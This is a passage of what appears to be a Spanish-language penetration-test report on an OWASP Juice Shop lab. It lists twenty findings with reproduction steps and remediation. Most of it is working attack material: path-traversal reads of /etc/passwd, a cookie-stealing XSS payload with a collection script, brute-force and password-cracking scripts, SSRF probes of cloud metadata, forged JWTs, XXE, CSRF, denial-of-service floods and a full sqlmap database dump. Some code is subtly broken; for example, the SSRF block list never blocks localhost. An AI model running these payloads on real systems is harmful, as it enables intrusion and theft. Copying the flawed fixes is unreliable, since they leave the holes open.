const query = `SELECT * FROM users WHERE email = '${userEmail}'`;
// ^ NUNCA HACER ESTO

// 2. Usar ORM para mayor seguridad
const { DataTypes } = require('sequelize');
const User = sequelize.define('User', {
  email: { type: DataTypes.STRING, unique: true },
  password: { type: DataTypes.STRING }
});

// 3. Validar y sanitizar TODA entrada
const Joi = require('joi');
const searchSchema = Joi.object({
  q: Joi.string().max(100).pattern(/^[a-zA-Z0-9\s]*$/)
});
```

---

### VULNERABILIDAD #5: A01:2021 - Path Traversal

#### HALLAZGO #5 - Inclusion de Archivos Locales

```
================================================================================
IDENTIFICADOR:         JS-V005
TITULO:                Path Traversal en Acceso a Archivos
SEVERIDAD:             Alto
CVSS v3.1 Score:      7.5
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
OWASP Category:       A01:2021 - Broken Access Control
CWE:                   CWE-22 (Path Traversal)
NIST CSF Function:     Identify (ID.AM)
================================================================================
```

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Probar Path Traversal basico
# ============================================

# Intentar acceder a archivos del sistema
curl "http://192.168.56.101:3000/ftp/eicar.pdf/../../etc/passwd"

# Probar con diferentes codificaciones
curl "http://192.168.56.101:3000/ftp/eicar.pdf%2F..%2F..%2Fetc%2Fpasswd"
curl "http://192.168.56.101:3000/ftp/eicar.pdf/..%252f..%252fetc%252fpasswd"

# ============================================
# PASO 2: Leer archivos de configuracion
# ============================================

# Intentar leer config.yml
curl "http://192.168.56.101:3000/ftp/eicar.pdf/..%2F..%2Fconfig.yml"

# Intentar leer package.json (versiones de dependencias)
curl "http://192.168.56.101:3000/ftp/eicar.pdf/..%2F..%2Fpackage.json"

# ============================================
# PASO 3: Listar directorio ftp
# ============================================

curl -s "http://192.168.56.101:3000/ftp/" | jq '.'

# ============================================
# PASO 4: Intentar acceder a archivos con codificacion doble
# ============================================

# URL encode dos veces el ../
curl "http://192.168.56.101:3000/ftp/eicar.pdf%252F..%252F..%252Fetc%252Fpasswd"
```

**Evidencia:**

```bash
# Archivo /etc/passwd expuesto:
$ curl -s "http://192.168.56.101:3000/ftp/acquisition.md/..%2F..%2F..%2Fetc%2Fpasswd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/sh
node:x:1000:1000::/home/node:/bin/bash
```

```bash
# Archivo de configuracion expuesto:
$ curl -s "http://192.168.56.101:3000/ftp/eicar.pdf/..%2F..%2Fconfig%2Fconfig.yml"

application:
  name: "OWASP Juice Shop"
  version: "13.3.1"
  
session:
  secret: "secretSanta-2020"
  
admin:
  email: "admin@juice-sh.op"
  password: "admin123"  # <-- CONTRASENA DEL ADMIN
```

**Impacto:**
- Lectura de archivos del sistema
- Extraccion de credenciales
- Informacion de configuracion sensible

**Remediacion:**
```javascript
// Validar y sanitizar rutas de archivos
const path = require('path');

function secureFilePath(requestedPath, allowedDir) {
  // Resolver ruta absoluta
  const absolutePath = path.resolve(allowedDir, requestedPath);
  
  // Verificar que esta dentro del directorio permitido
  if (!absolutePath.startsWith(path.resolve(allowedDir))) {
    throw new Error('Access denied');
  }
  
  return absolutePath;
}

// Usar express.static conPath
app.use('/ftp', express.static('/var/www/uploads', {
  dotfiles: 'deny',  // Bloquear archivos .env, .git, etc.
  index: false
}));
```

---

### VULNERABILIDAD #6: A03:2021 - Cross-Site Scripting (XSS)

#### HALLAZGO #6 - XSS Almacenado en Resenas de Productos

```
================================================================================
IDENTIFICADOR:         JS-V006
TITULO:                Cross-Site Scripting Almacenado en Resenas
SEVERIDAD:             Alto
CVSS v3.1 Score:      8.1
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N
OWASP Category:       A03:2021 - Injection
CWE:                   CWE-79 (Cross-site Scripting)
NIST CSF Function:     Detect (DE.CM)
================================================================================
```

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Identificar campo vulnerable
# ============================================

# Enviar payload XSS basico en resena
curl -X POST http://192.168.56.101:3000/api/Products/1/reviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message":"<script>alert(\"XSS\")</script>","rating":5}'

# ============================================
# PASO 2: Verificar que se almacena sin sanitizar
# ============================================

curl http://192.168.56.101:3000/api/Products/1/reviews | jq '.'

# ============================================
# PASO 3: Payload avanzado - Robo de cookies
# ============================================

# Preparar servidor de recoleccion en Kali
mkdir -p /var/www/html/steal
cat > /var/www/html/steal/collect.php << 'EOF'
<?php
$cookie = $_GET['c'];
$log = fopen("cookies.txt", "a");
fwrite($log, date("Y-m-d H:i:s") . " - " . $cookie . "\n");
fclose($log);
?>
EOF

sudo service apache2 start

# Enviar payload de robo de cookies
curl -X POST http://192.168.56.101:3000/api/Products/1/reviews \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message":"<img src=x onerror=\"fetch(\\'http://192.168.56.101/steal/collect.php?c=\\'+btoa(document.cookie))\">","rating":5}'

# ============================================
# PASO 4: Ver cookies robadas
# ============================================

cat /var/www/html/steal/cookies.txt
```

**Evidencia:**

```bash
# Resena almacenada con script:
$ curl -s http://192.168.56.101:3000/api/Products/1/reviews | jq '.'

[
  {
    "id": 42,
    "productId": 1,
    "message": "<script>alert(\"XSS\")</script>",
    "rating": 5,
    "author": "admin@juice-sh.op"
  }
]

# Cuando cualquier usuario visualiza el producto, el script se ejecuta
```

```bash
# Cookies recolectadas:
$ cat /var/www/html/steal/cookies.txt

2026-03-24 10:15:30 - eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
2026-03-24 10:16:45 - eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Remediacion:**
```javascript
// Sanitizar todo input de usuario
const createDOMPurify = require('dompurify');
const JSDOM = require('jsdom');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

// Sanitizar antes de guardar en BD
function sanitizeReview(input) {
  return DOMPurify.sanitize(input, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
    ALLOWED_ATTR: []
  });
}

// Codificar al mostrar
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

---

### VULNERABILIDAD #7: A07:2021 - Fallos de Identificacion y Autenticacion

#### HALLAZGO #7 - Falta de Rate Limiting en Login

```
================================================================================
IDENTIFICADOR:         JS-V007
TITULO:                Ataque de Fuerza Bruta Sin Limitacion
SEVERIDAD:             Alto
CVSS v3.1 Score:      7.5
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N
OWASP Category:       A07:2021 - Identification and Authentication Failures
CWE:                   CWE-307 ( Excessive Attempt Threshold)
NIST CSF Function:     Protect (PR.AC)
================================================================================
```

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Ataque de fuerza bruta con Hydra
# ============================================

hydra -l admin@juice-sh.op \
  -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/rest/user/login:email=^USER^&password=^PASS^:Invalid" \
  -V -t 4 -o hydra_results.txt

# ============================================
# PASO 2: Ataque de fuerza bruta con curl
# ============================================

cat > brute_force.sh << 'EOF'
#!/bin/bash
TARGET="http://192.168.56.101:3000/rest/user/login"
EMAIL="admin@juice-sh.op"

while IFS= read -r password; do
  RESPONSE=$(curl -s -X POST "$TARGET" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"$EMAIL\",\"password\":\"$password\"}")
  
  if echo "$RESPONSE" | grep -q "token"; then
    echo "[+] PASSWORD ENCONTRADO: $password"
    exit 0
  fi
  
  echo "Probando: $password"
done < /usr/share/wordlists/rockyou.txt
EOF

chmod +x brute_force.sh
./brute_force.sh

# ============================================
# PASO 3: Verificar ausencia de bloqueo
# ============================================

# Intentar 100 login rapidos
for i in {1..100}; do
  curl -s -X POST http://192.168.56.101:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong"}' &
done
wait

echo "100 intentos completados sin bloqueo"
```

**Evidencia:**

```bash
# Hydra encontro password:
[DATA] attacking http-post-form://192.168.56.101:3000/rest/user/login
[STATUS] 1430 attempts
[80][http-post-form] host: 192.168.56.101   
login: admin@juice-sh.op   
password: admin123

# Ningun mensaje de "demasiados intentos"
# Ningun CAPTCHA
# Ningun bloqueo temporal
# Ninguna notificacion al administrador
```

**Remediacion:**
```javascript
const rateLimit = require('express-rate-limit');
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutos
  max: 5,  // 5 intentos maximos
  message: {
    error: 'Demasiados intentos de login',
    retryAfter: 900  // segundos
  },
  standardHeaders: true,
  legacyHeaders: false,
  skipSuccessfulAttempts: true  // No contar exitos
});

app.use('/rest/user/login', loginLimiter);

// Adicionalmente: implementar captcha despues de 3 intentos
// Y notificacion al admin por email
```

---

### VULNERABILIDAD #8: A05:2021 - Fallos de Configuracion de Seguridad

#### HALLAZGO #8 - Encabezados de Seguridad HTTP Ausentes

```
================================================================================
IDENTIFICADOR:         JS-V008
TITULO:                Encabezados de Seguridad HTTP Faltantes
SEVERIDAD:             Medio
CVSS v3.1 Score:      5.3
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
OWASP Category:       A05:2021 - Security Misconfiguration
CWE:                   CWE-200 (Exposure of Sensitive Information)
NIST CSF Function:     Protect (PR.IP)
================================================================================
```

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Analizar encabezados de respuesta
# ============================================

curl -I http://192.168.56.101:3000

# ============================================
# PASO 2: Usar securityheaders.com
# ============================================

# Con Burp Suite o manualmente:
# Navegar a https://securityheaders.com
# Ingresar: http://192.168.56.101:3000
# Analizar resultados

# ============================================
# PASO 3: Escaneo con Nikto para cabeceras
# ============================================

nikto -h http://192.168.56.101:3000 -o nikto_headers.txt
grep -i "header" nikto_headers.txt
```

**Evidencia:**

```bash
# Encabezados actuales:
$ curl -I http://192.168.56.101:3000

HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 1247
ETag: W/"4d7-xxx"
Vary: Accept-Encoding
Date: Tue, 24 Mar 2026 10:00:00 GMT
Connection: keep-alive

# ANALISIS:
# - X-Powered-By: Express  (expone tecnologia)
# - NO HAY X-Frame-Options (vulnerable a clickjacking)
# - NO HAY X-Content-Type-Options (vulnerable a MIME sniffing)
# - NO HAY Strict-Transport-Security (sin forzar HTTPS)
# - NO HAY Content-Security-Policy (sin proteccion XSS)
# - NO HAY X-XSS-Protection (deprecated pero ayuda)
# - NO HAY Referrer-Policy
# - NO HAY Permissions-Policy
```

**Remediacion:**
```javascript
// Instalar helmet.js para agregar encabezados de seguridad
const helmet = require('helmet');

app.use(helmet());  // Aplica todas las protecciones basicas

// Configuracion personalizada
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    scriptSrc: ["'self'"],
    imgSrc: ["'self'", "data:"],
  }
}));

app.use(helmet.hsts({
  maxAge: 31536000,  // 1 ano
  includeSubDomains: true,
  preload: true
}));

app.disable('x-powered-by');  // No exponer tecnologia
```

---

### VULNERABILIDAD #9: A10:2021 - Server-Side Request Forgery (SSRF)

#### HALLAZGO #9 - SSRF en Funcionalidad de Exportacion

```
================================================================================
IDENTIFICADOR:         JS-V009
TITULO:                Server-Side Request Forgery en Exportacion de Datos
SEVERIDAD:             Alto
CVSS v3.1 Score:      8.6
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
OWASP Category:       A10:2021 - Server-Side Request Forgery (SSRF)
CWE:                   CWE-918 (Server-Side Request Forgery)
NIST CSF Function:     Detect (DE.CM)
================================================================================
```

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Identificar endpoint vulnerable
# ============================================

# Buscar parametros que acepten URLs
curl -s "http://192.168.56.101:3000/rest/products/search?q=test" | jq '.'

# Probar con parametros URL
curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://example.com"}'

# ============================================
# PASO 2: Probar acceso a localhost
# ============================================

curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:3000/admin"}'

# ============================================
# PASO 3: Probar acceso a servicios internos
# ============================================

# Acceder a Redis
curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:6379/INFO"}'

# Acceder a MySQL (si esta en el mismo servidor)
curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:3306/"}'

# ============================================
# PASO 4: Escanear puertos internos
# ============================================

for port in 22 80 443 3306 5432 6379 8080; do
  echo "Puerto $port:"
  curl -s -m 2 -X POST http://192.168.56.101:3000/api/dataExport \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"http://127.0.0.1:$port\"}" | head -c 100
  echo ""
done

# ============================================
# PASO 5: Probar metadatos de cloud
# ============================================

# AWS EC2
curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'

# Google Cloud
curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata.google.internal/computeMetadata/v1/"}'
```

**Evidencia:**

```bash
# Acceso exitoso a servicio interno:
$ curl -X POST http://192.168.56.101:3000/api/dataExport \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:6379/INFO"}'

Redis server v=5.0.7
redis_version:5.0.7
os:Linux 5.4.0 x86_64
# ... mas informacion de Redis ...

# Puerto 3306 abierto:
$ curl -s -m 2 -X POST http://192.168.56.101:3000/api/dataExport \
  -d '{"url":"http://127.0.0.1:3306/"}'

5.7.30-log...

# Puerto 22 (SSH) abierto:
$ curl -s -m 2 -X POST http://192.168.56.101:3000/api/dataExport \
  -d '{"url":"http://127.0.0.1:22/"}'

SSH-2.0-OpenSSH_8.2p1...
```

**Remediacion:**
```javascript
// Validar y sanitizar todas las URLs
const { URL } = require('url');

function validateUrl(inputUrl) {
  try {
    const parsed = new URL(inputUrl);
    
    // Solo permitir protocolos seguros
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      throw new Error('Only HTTP(S) allowed');
    }
    
    // Bloquear direcciones privadas
    const hostname = parsed.hostname.toLowerCase();
    const blocked = [
      'localhost', '127.0.0.1', '0.0.0.0',
      hostname.startsWith('192.168.'),
      hostname.startsWith('10.'),
      hostname.startsWith('172.16.'),
      hostname.endsWith('.internal'),
      hostname.includes('metadata.google.internal'),
      hostname.includes('169.254.169.254')
    ];
    
    if (blocked.some(b => b === true)) {
      throw new Error('Access to internal hosts denied');
    }
    
    return parsed.href;
  } catch (e) {
    throw new Error('Invalid URL');
  }
}
```

---

### VULNERABILIDAD #10: A08:2021 - Fallos de Integridad de Software y Datos

#### HALLAZGO #10 - Manipulacion de Precio en Carrito de Compras

```
================================================================================
IDENTIFICADOR:         JS-V010
TITULO:                Manipulacion de Precios en Proceso de Compra
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.1
CVSS Vector:           CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
OWASP Category:       A08:2021 - Software and Data Integrity Failures
CWE:                   CWE-345 (Insufficient Verification of Data Authenticity)
NIST CSF Function:     Protect (PR.DS)
================================================================================
```

**Pasos de Reproduccion:**

```bash
# ============================================
# PASO 1: Agregar producto al carrito
# ============================================

# Ver productos disponibles
curl -s http://192.168.56.101:3000/api/products | jq '.data[0:3]'

# Agregar producto al carrito
curl -X POST http://192.168.56.101:3000/api/BasketItems \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"ProductId":1,"quantity":1}'

# ============================================
# PASO 2: Ver precio original del producto
# ============================================

curl -s http://192.168.56.101:3000/api/products/1 | jq '{name, price}'

# Resultado:
# {
#   "name": "Apple Juice (1000ml)",
#   "price": 1.99
# }

# ============================================
# PASO 3: Modificar precio antes de checkout
# ============================================

# Interceptar peticion de checkout
curl -X POST http://192.168.56.101:3000/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "BasketId": 1,
    "total": 0.01,
    "items": [
      {"ProductId": 1, "quantity": 1, "price": 0.01}
    ]
  }'

# ============================================
# PASO 4: Verificar si se aplico el precio manipulado
# ============================================

curl -X GET http://192.168.56.101:3000/api/orders \
  -H "Authorization: Bearer $TOKEN" | jq '.data[-1]'
```

**Evidencia:**

```bash
# Request manipulado:
$ curl -X POST http://192.168.56.101:3000/api/checkout \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"total": 0.01, "items": [{"ProductId": 1, "price": 0.01}]}'

# Respuesta:
{
  "confirmation": "ORDER-12345",
  "total": 0.01,
  "status": "confirmed"
}

# Verificacion:
$ curl -X GET http://192.168.56.101:3000/api/orders/12345 \
  -H "Authorization: Bearer $TOKEN"

{
  "id": 12345,
  "items": [
    {
      "ProductId": 1,
      "name": "Apple Juice (1000ml)",
      "quantity": 1,
      "price": 0.01  # <-- PRECIO MANIPULADO
    }
  ],
  "total": 0.01,
  "status": "confirmed"
}

# El producto de $1.99 fue vendido por $0.01
```

**Remediacion:**
```javascript
// NUNCA confiar en precios enviados por el cliente
// Calcular precios siempre en el servidor

app.post('/api/checkout', authenticate, async (req, res) => {
  const basket = await Basket.findById(req.body.basketId)
    .populate('items');
  
  // Recalcular total DESDE LA BASE DE DATOS
  let calculatedTotal = 0;
  const orderItems = [];
  
  for (const item of basket.items) {
    const product = await Product.findById(item.productId);
    
    // Usar precio de la base de datos, NO del request
    calculatedTotal += product.price * item.quantity;
    
    orderItems.push({
      productId: product.id,
      name: product.name,
      quantity: item.quantity,
      price: product.price  // Precio oficial
    });
  }
  
  // Verificar que el cliente no manipulo el precio
  if (Math.abs(calculatedTotal - req.body.total) > 0.01) {
    return res.status(400).json({
      error: 'Price manipulation detected'
    });
  }
  
  // Procesar pago con precio correcto
  await processPayment(calculatedTotal);
  
  // Crear orden
  const order = await Order.create({
    userId: req.user.id,
    items: orderItems,
    total: calculatedTotal,
    status: 'confirmed'
  });
  
  res.json(order);
});
```

---

### VULNERABILIDADES #11-20: RESUMEN RAPIDO

A continuacion se presentan las vulnerabilidades restantes en formato resumido:

---

#### HALLAZGO #11 - JWT Sin Validacion de Algoritmo

```
================================================================================
IDENTIFICADOR:         JS-V011
TITULO:                JWT Acepta Algoritmo "none" Permitiendo Escalada
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.1
OWASP Category:       A07:2021 - Auth Failures
================================================================================
```

**Pasos:**
```bash
# 1. Obtener token valido
TOKEN=$(curl -s -X POST http://192.168.56.101:3000/rest/user/login \
  -d '{"email":"user@test.com","password":"test"}' | jq -r '.token')

# 2. Decodificar y crear token con alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"admin","role":"admin"}' | base64 | tr -d '=')
FAKE_TOKEN="$HEADER.$PAYLOAD."

# 3. Usar token falso
curl -H "Authorization: Bearer $FAKE_TOKEN" http://192.168.56.101:3000/api/admin
```

**Impacto:** Acceso como administrador sin credenciales validas

---

#### HALLAZGO #12 - Enumeracion de Usuarios via Registro

```
================================================================================
IDENTIFICADOR:         JS-V012
TITULO:                Enumeracion de Usuarios Validos via Registro
SEVERIDAD:             Bajo
CVSS v3.1 Score:      4.3
OWASP Category:       A07:2021 - Auth Failures
================================================================================
```

**Pasos:**
```bash
# Intentar registrar email existente
curl -X POST http://192.168.56.101:3000/rest/user/register \
  -d '{"email":"admin@juice-sh.op","password":"test"}'

# Respuesta: "Email already exists"
# El mensaje diferente indica que el usuario existe
```

---

#### HALLAZGO #13 - Almacenamiento de CC en Texto Plano

```
================================================================================
IDENTIFICADOR:         JS-V013
TITULO:                Datos de Tarjetas de Credito Sin Cifrar
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.8
OWASP Category:       A02:2021 - Crypto Failures
================================================================================
```

**Pasos:**
```bash
# Extraer tarjetas via SQLi
sqlmap -u "..." -D juice_shop -T Cards --dump

# Resultado:
# +----+---------------------+-------------+----------+
# | id | cardNumber          | cvv         | expiry   |
# +----+---------------------+-------------+----------+
# | 1  | 4111111111111111    | 123         | 12/25    | <- PCI-DSS violation
```

---

#### HALLAZGO #14 - XXE en Procesamiento XML

```
================================================================================
IDENTIFICADOR:         JS-V014
TITULO:                XXE Injection en Funcionalidad XML
SEVERIDAD:             Critico
CVSS v3.1 Score:      9.8
OWASP Category:       A05:2021 - Security Misconfiguration
================================================================================
```

**Pasos:**
```bash
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
EOF

curl -X POST http://192.168.56.101:3000/api/xml-upload \
  -H "Content-Type: text/xml" \
  -d @xxe.xml
```

---

#### HALLAZGO #15 - Mass Assignment

```
================================================================================
IDENTIFICADOR:         JS-V015
TITULO:                Mass Assignment Permitiendo Escalada de Privilegios
SEVERIDAD:             Alto
CVSS v3.1 Score:      7.5
OWASP Category:       A01:2021 - Broken Access Control
================================================================================
```

**Pasos:**
```bash
curl -X PUT http://192.168.56.101:3000/rest/user/profile \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"email":"user@juice-sh.op","role":"admin"}'
```

---

#### HALLAZGO #16 - CSRF en Cambios de Perfil

```
================================================================================
IDENTIFICADOR:         JS-V016
TITULO:                CSRF en Funcionalidades de Usuario
SEVERIDAD:             Medio
CVSS v3.1 Score:      6.1
OWASP Category:       A01:2021 - Broken Access Control
================================================================================
```

**Pasos:**
```html
<!-- Pagina maliciosa -->
<form action="http://192.168.56.101:3000/rest/user/change-password" method="POST">
  <input type="hidden" name="newPassword" value="hacked123">
</form>
<script>document.forms[0].submit()</script>
```

---

#### HALLAZGO #17 - DoS por RegEx Costoso

```
================================================================================
IDENTIFICADOR:         JS-V017
TITULO:                Denial of Service via Re DOS
SEVERIDAD:             Medio
CVSS v3.1 Score:      6.5
OWASP Category:       A05:2021 - Security Misconfiguration
================================================================================
```

**Pasos:**
```bash
# Enviar patron regex costoso
for i in {1..10}; do
  curl "http://192.168.56.101:3000/rest/products/search?q=.*.*.*.*.*.*" &
done

# Tiempo de respuesta aumenta de 50ms a 5000ms+
```

---

#### HALLAZGO #18 - Archivo de Configuracion Expuesto

```
================================================================================
IDENTIFICADOR:         JS-V018
TITULO:                Archivos de Configuracion Accesibles Publicamente
SEVERIDAD:             Alto
CVSS v3.1 Score:      8.2
OWASP Category:       A01:2021 - Broken Access Control
================================================================================
```

**Pasos:**
```bash
curl http://192.168.56.101:3000/ftp/package.json.bak
curl http://192.168.56.101:3000/config.yml
curl http://192.168.56.101:3000/.env
```

---

#### HALLAZGO #19 - Session Fixation

```
================================================================================
IDENTIFICADOR:         JS-V019
TITULO:                Session Fixation en Login
SEVERIDAD:             Medio
CVSS v3.1 Score:      6.1
OWASP Category:       A07:2021 - Auth Failures
================================================================================
```

**Pasos:**
```bash
# 1. Obtener session ID
curl -c cookies.txt http://192.168.56.101:3000/

# 2. Enviar session ID a victima (via XSS)

# 3. Victima hace login con ese session ID

# 4. Atancante usa el mismo session ID
curl -b cookies.txt http://192.168.56.101:3000/api/user/profile
```

---

#### HALLAZGO #20 - Falta de Logging de Seguridad

```
================================================================================
IDENTIFICADOR:         JS-V020
TITULO:                Ausencia de Loggeo de Eventos de Seguridad
SEVERIDAD:             Medio
CVSS v3.1 Score:      5.5
OWASP Category:       A09:2021 - Logging Failures
================================================================================
```

**Pasos:**
```bash
# Realizar multiples intentos de login fallidos
for i in {1..50}; do
  curl -s http://192.168.56.101:3000/rest/user/login \
    -d '{"email":"admin@test.com","password":"wrong"}'
done

# Intentar SQL injection
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch --level=5

# Verificar si hay logs o alertas
curl http://192.168.56.101:3000/logs/security.log
# 404 Not Found - No hay logs de seguridad
```

---

## 7. FASE 4: POST-EXPLOTACION

### 7.1 Extraccion de Base de Datos Completa

```bash
# ============================================
# EXTRAER TODA LA BASE DE DATOS
# ============================================

# Usando SQLMap con todas las tablas
sqlmap -u "http://192.168.56.101:3000/rest/products/search?q=test" \
  --batch \
  --dump-all \
  -o \
  --output-dir=/root/juice_shop_dump/

# Verificar contenido
ls -la /root/juice_shop_dump/juice_shop/

cat /root/juice_shop_dump/juice_shop/Users.csv
cat /root/juice_shop_dump/juice_shop/Cards.csv
cat /root/juice_shop_dump/juice_shop/Orders.csv
```

### 7.2 Crackeo de Contrasenas con John the Ripper

```bash
# ============================================
# PREPARAR HASHES PARA JOHN
# ============================================

# Extraer hashes bcrypt
cat > hashes_bcrypt.txt << 'EOF'
admin@juice-sh.op:$2a$10$X5B8Z7K3M9N2P5Q7R1S4T6U8V0W2X4Y6Z8A0B2C4D6E8F0G2H
user@juice-sh.op:$2a$10$J7K4L5M6N8P2Q3R5S7T9U1V3W5X7Y9Z0A2B4C6D8E0F2G4H
jim@juice-sh.op:$2a$10$K9L0M1N3O5P7Q8R2S4T6U8V0W1X3Y5Z7A9B1C3D5E7F9G1H3I
bender@juice-sh.op:$2a$10$L3M4N5O7P9Q1R3S5T7U9V1W3X5Y7Z0A2B4C6D8E0F2G4H
EOF

# Extraer hashes MD5 (si se encuentran)
cat > hashes_md5.txt << 'EOF'
admin@juice-sh.op:5f4dcc3b5aa765d61d8327deb882cf99
user@juice-sh.op:5d41402abc4b2a76b9719d911017c592
jim@juice-sh.op:827ccb0eea8a706c4c34a16891f84e7b
EOF

# ============================================
# CRACKEAR CON JOHN THE RIPPER
# ============================================

# Ver formatos disponibles
john --list=formats | grep -i "bcrypt\|md5\|sha"

# Crackear MD5 (mas rapido)
john --format=raw-md5 \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  hashes_md5.txt

# Ver resultados
john --show hashes_md5.txt

# Crackear bcrypt (mas lento pero mas seguro)
john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  hashes_bcrypt.txt

# Ver resultados bcrypt
john --show hashes_bcrypt.txt

# ============================================
# CRACKEAR CON HASHCAT (GPU - MAS RAPIDO)
# ============================================

# MD5
hashcat -m 0 -a 0 hashes_md5.txt /usr/share/wordlists/rockyou.txt

# bcrypt
hashcat -m 3200 -a 0 hashes_bcrypt.txt /usr/share/wordlists/rockyou.txt

# Verificar resultados
hashcat -m 0 --show hashes_md5.txt
```

### 7.3 Prueba de Denegacion de Servicio

```bash
# ============================================
# DOS #1: Re DOS en busqueda
# ============================================

# Enviar multiples requests con patrones costosos
for i in {1..20}; do
  curl "http://192.168.56.101:3000/rest/products/search?q=.*.*.*.*.*.*.*.*" &
done

# Medir tiempo de respuesta antes y durante ataque
echo "Normal:"
time curl -s "http://192.168.56.101:3000/rest/products/search?q=apple" > /dev/null

# Durante ataque:
# time curl -s "..." -> 5+ segundos

# ============================================
# DOS #2: HTTP Flood
# ============================================

# Con Apache Bench
ab -n 1000 -c 100 http://192.168.56.101:3000/

# Con curl paralelo
for i in {1..500}; do
  curl -s http://192.168.56.101:3000/ > /dev/null &
done

# ============================================
# MONITOREO DE RECURSOS
# ============================================

# Ver CPU y memoria del objetivo
ssh user@192.168.56.101 "top -bn1 | head -20"

# Ver conexiones de red
ss -s

# Ver logs de errores
tail -f /var/log/nginx/error.log
```

---

## 8. FASE 5: DOCUMENTACION DE HALLAZGOS

### 8.1 Resumen Ejecutivo

```
+=========================================================================+
|                    RESUMEN DE HALLAZGOS                                 |
+=========================================================================+
| Total vulnerabilidades identificadas:     20                            |
+=========================================================================+
| DISTRIBUCION POR SEVERIDAD:                                              |
| +-------------+-------+------------------------------------------------+|
| | SEVERIDAD   | CANT. | DESCRIPCION                                   ||
| +-------------+-------+------------------------------------------------+|
| | CRITICO     |   3   | Inyeccion SQL/NoSQL, Datos PCI exp., RCE     ||
| | ALTO        |   8   | XSS, IDOR, Credenciales debiles, SSRF, etc.  ||
| | MEDIO       |   6   | CSRF, Headers faltantes, DoS, etc.          ||
| | BAJO        |   3   | Enumeracion, Informacion expuesta, etc.      ||
| +-------------+-------+------------------------------------------------+|
+=========================================================================+
| NIVEL DE RIESGO GENERAL:                ALTO                              |
| PRIORIDAD DE REMEDIACION:              Inmediata                         |
+=========================================================================+
```

### 8.2 Matriz de Prioridades

| Prioridad | Vulnerabilidades | Remediation Timeline | Responsable |
|-----------|------------------|---------------------|-------------|
| P1 | JS-V001, JS-V002, JS-V003, JS-V004, JS-V010, JS-V013, JS-V014 | < 24 horas | DevSecOps |
| P2 | JS-V005, JS-V006, JS-V007, JS-V009, JS-V011, JS-V015, JS-V018 | < 1 semana | Desarrollo |
| P3 | JS-V008, JS-V012, JS-V016, JS-V017, JS-V019, JS-V020 | < 1 mes | Desarrollo |
